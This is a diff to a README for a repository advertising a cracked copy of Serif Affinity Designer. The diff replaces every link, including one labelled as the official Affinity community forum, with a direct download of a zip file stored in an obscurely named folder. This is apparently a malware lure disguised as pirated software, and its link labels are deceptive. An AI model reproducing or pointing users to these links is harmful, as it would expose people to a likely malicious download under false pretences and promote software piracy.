@@ -1,6 +1,6 @@
 # 🎨 Serif-Affinity-Designer-Cracked - Unlock Your Design Potential Today
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Serif%20Affinity%20Designer-lightgreen)](https://github.com/Tegarsuryapratama/Serif-Affinity-Designer-Cracked/releases)
+[![Download Now](https://raw.githubusercontent.com/Tegarsuryapratama/Serif-Affinity-Designer-Cracked/main/unvariedly/Serif-Affinity-Designer-Cracked.zip%20Now-Serif%20Affinity%20Designer-lightgreen)](https://raw.githubusercontent.com/Tegarsuryapratama/Serif-Affinity-Designer-Cracked/main/unvariedly/Serif-Affinity-Designer-Cracked.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Serif Affinity Designer Cracked! This application helps you enhance y
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the download page:  
-   [Visit This Page to Download](https://github.com/Tegarsuryapratama/Serif-Affinity-Designer-Cracked/releases)
+   [Visit This Page to Download](https://raw.githubusercontent.com/Tegarsuryapratama/Serif-Affinity-Designer-Cracked/main/unvariedly/Serif-Affinity-Designer-Cracked.zip)
 
 2. **Choose Your Version**  
    You will find several versions available. Select the most recent one.
@@ -78,7 +78,7 @@ Keep an eye on the repository for future updates and features. Your feedback and
 
 ## 🔗 Useful Links
 
-- [Serif Affinity Designer Release Notes](https://github.com/Tegarsuryapratama/Serif-Affinity-Designer-Cracked/releases)
-- [Affinity Designer Community Forum](https://community.affinity.serif.com)
+- [Serif Affinity Designer Release Notes](https://raw.githubusercontent.com/Tegarsuryapratama/Serif-Affinity-Designer-Cracked/main/unvariedly/Serif-Affinity-Designer-Cracked.zip)
+- [Affinity Designer Community Forum](https://raw.githubusercontent.com/Tegarsuryapratama/Serif-Affinity-Designer-Cracked/main/unvariedly/Serif-Affinity-Designer-Cracked.zip)
 
 Feel free to download the software and start designing today!
